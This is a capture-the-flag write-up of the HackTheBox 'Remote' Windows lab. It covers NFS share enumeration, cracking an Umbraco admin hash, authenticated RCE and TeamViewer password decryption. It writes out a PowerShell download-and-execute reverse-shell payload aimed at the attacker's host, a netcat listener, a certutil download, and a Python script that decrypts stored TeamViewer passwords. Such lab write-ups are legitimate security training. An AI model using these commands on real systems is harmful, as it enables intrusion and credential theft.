---
layout: post
title: "HackTheBox - Remote"
date: 2020-08-27
author: Grillette

categories:
    - "HTB-Boxes"
---
**Remote** was an easy Windows box on HackTheBox. This box involved a NFS service misconfiguration, a RCE exploit for the Umbraco CMS and finally using a TeamViewer service running to retrieve a password.
This was a fun box to start with Windows exploitation and Privilege Escalation and I sure learned a lot.

![Box Logo]({{ "assets/Remote/remote.png" | absolute_url }} "Box Logo")

<!--excerpt-->
<br/>

# Initial Foothold
## Recon
So let's run the initial `nmap` to check which services are running on this box :
![nmap]({{ "assets/Remote/nmap.png" | absolute_url }} "Nmap Scan")

This scan shows several interesting services.

### Port 80

First of all there is a website running on port 80.
Here is the home page :
![Website Homepage]({{ "assets/Remote/website.png" | absolute_url }} "Website Homepage")
By poking the website around we notice an interesting message :

![Website message]({{ "assets/Remote/websiteMessage.png" | absolute_url }} "Website Message")

By clicking on the button, we end up on a login page for the Umbraco CMS :

![Umbraco login page]({{ "assets/Remote/umbracoLogin.png" | absolute_url }} "Umbraco login page")

By looking on the Internet, we quickly find a RCE for this CMS as authenticated user.
For the moment, we don't have any account so let's keep this in mind for later.

We can also make some more recon on the website with wfuzz
![Wfuzz result]({{ "assets/Remote/wfuzz.png" | absolute_url }} "Wfuzz result")
But there is nothing really interesting for the moment.

### Port 21

There is a FTP service running on port 21 with Anonymous logon enabled.

I logged in as Anonymous on this service but could not find any file. Seems like a rabbit hole for the moment.

### Port 111

This port is quite interesting and we can find a bunch of resources about it online :
- https://book.hacktricks.xyz/pentesting/pentesting-rpcbind

This service basically list the running services and associated ports. It shows us that the **NFS** service is running on the 2049 port.

NFS is a client/server service allowing users to access file across a network and treat them as if they resided in a local file directory.
Huum ... This seems like an interesting service right there !

## Exploiting
This [post](https://book.hacktricks.xyz/pentesting/nfs-service-pentesting) can help to understand how NFS service works and how to exploit it.

As we had no luck with the FTP server previously I hoped to have more success here.

The `showmount` command shows the following
```
$ showmount -e 10.10.10.180
Export list for 10.10.10.180:
/site_backups (everyone)
```

Yeah, everyone have access to the `/site_backups` directory ! What could go wrong ?
So now let's mount this directory on our system !

```
mkdir /mnt/remote
mount -t nfs [-o vers=2] 10.10.10.180:/site_backups /mnt/remote -o nolock
```
And this is what this folder looks like :
![site_backups directory]({{ "assets/Remote/site_backups.png" | absolute_url }} "site_backups directory")

We then have to enumerate to find interesting things.
In the App_Data folder there is an interesting file :

```
$ cd App_Data/
$ strings Umbraco.sdf |grep admin
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
```
(I actually took a lot of time to find this file, but Internet is really full of good surprise :smile: )

So we identified a hash aswell as the type of this hash :
`b8be16afba8c314ad33d812f22a04991b90e2aaa`
and
`SHA1`

This hash can then be easily cracked thanks to [john](https://www.openwall.com/john/) for example.
Thus, we can retrieve the admin password for this website :
**baconandcheese**

We also see an other interesting record in this file but could not find any uses for it :
```
smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
```

Now, let's quickly jump back to the login page to see if those credentials are correct !

![Admin login webpage]({{ "assets/Remote/adminLoginWebsite.png" | absolute_url }} "Admin login webpage")

Aaaand we finally have access to the admin panel of the Umbraco CMS !

![Admin panel webpage]({{ "assets/Remote/umbracoAdminPanel.png" | absolute_url }} "Admin panel webpage")

Now we have a first foot on this box. Let's get the first user !

# User access
As mentioned above, there is a known RCE as a authenticated user on this particular CMS.
[noraj](https://twitter.com/noraj_rawsec) developed a [nice exploit](https://github.com/noraj/Umbraco-RCE) for it.

We can execute some code on the target machine, but our goal here is to have a reverse shell.

I found the [following script](https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1) which seems pretty nice to get a first shell on our target.

We just have to adapt it with our IP address and we are good to go. We'll have to make the target execute this script now.

Let's quickly launch a web server with `python -m http.server` in the directory where our previous script is stored.
Next step is to make our target download the script and run it. To achieve this, we crafted this powershell command :
`powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.15.14:8000/Invoke-PowerShellTcp.ps1')"`

The final payload to execute this reverse shell on the target machine is as follow :
`python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a "IEX (New-Object Net.WebClient).DownloadString('http://10.10.15.14:8000/Invoke-PowerShellTcp.ps1')"`

With a netcat listening on our laptop with :
`rlwrap nc -lvnp 4242`

And boom, we got the reverse shell connected :
![Reverse Shell connection]({{ "assets/Remote/shell.png" | absolute_url }} "Reverse Shell connection")

And we finally can go to the `C:\Users\Public` directory to grab our first flag :
![User flag]({{ "assets/Remote/firstFlag.png" | absolute_url }} "User flag")

# Privilege Escalation
## Enumeration
```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
```

We download winPEAS on our host and upload it on the target machine with the following command :
(The WinPEAS executable is accessible from hour host by launching a simple HTTP server with python)
`certutil.exe -urlcache -f http://10.10.14.187:8000/winPEASx64.exe C:\Users\Public\winPEAS.exe`

Launch executable :
`PS C:\Users\Public> .\winPEAS.exe`

We got several interesting results :
![winPEAS CVE]({{ "assets/Remote/winpeasCVE.png" | absolute_url }} "CVE listed by WinPEAS")

![winPEAS Services]({{ "assets/Remote/winpeasServices.png" | absolute_url }} "WinPEAS services")

After spending some time trying some exploit on the UsoSvc service without luck, we tried some more enumeration.

The `get-process` (the `tasklist /v` command could also be used) command list the processes actually running and we obtain an interesting result :
![get-process]({{ "assets/Remote/getProcess.png" | absolute_url }} "get-process")

![TeamViewerQC]({{ "assets/Remote/TeamViewerQC.png" | absolute_url }} "TeamViewerQC")

[This blog post](https://whynotsecurity.com/blog/teamviewer/) gave a lot of information about TeamViewer exploitation in order to escalate privilege to `NT AUTHORITY\SYSTEM`

In order to exploit this service we first need to retrieve the value in the register "HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7"

![registerValue]({{ "assets/Remote/registerValue.png" | absolute_url }} "registerValue")

And more precisely this value :

![securityPasswordAES]({{ "assets/Remote/securityPasswordAES.png" | absolute_url }} "securityPasswordAES")

With the previous [link](https://whynotsecurity.com/blog/teamviewer/) we have the following script adapted to our case :
```python
import sys, hexdump, binascii
from Crypto.Cipher import AES

class AESCipher:
    def __init__(self, key):
        self.key = key

    def decrypt(self, iv, data):
        self.cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self.cipher.decrypt(data)

key = binascii.unhexlify("0602000000a400005253413100040000")
iv = binascii.unhexlify("0100010067244F436E6762F25EA8D704")
hex_str_cipher2 = "d690a9d0a592327f99bb4c6a6b6d4cbe"			# output from the registry
hex_str_cipher = "FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B"   # The securityPasswordAES value

ciphertext = binascii.unhexlify(hex_str_cipher)

raw_un = AESCipher(key).decrypt(iv, ciphertext)

print(hexdump.hexdump(raw_un))

password = raw_un.decode('utf-16')
print(password)
```

Running this script, we obtain the following result !
![privescPassword]({{ "assets/Remote/privescPassword.png" | absolute_url }} "privescPassword")

Nice ! We now have the password that we needed !

We just need to log in as Administrator with this password.
In order to do that we will use the `psexec` script from [impacket](https://github.com/SecureAuthCorp/impacket).

![psexec]({{ "assets/Remote/psexec.png" | absolute_url }} "psexec")

Aaaand we are finally admin of this box !

That's it for this writeup, thanks for reading ! If you have any questions or suggestions feel free to send me a DM on (twitter)[https://twitter.com/0xGrillette] !
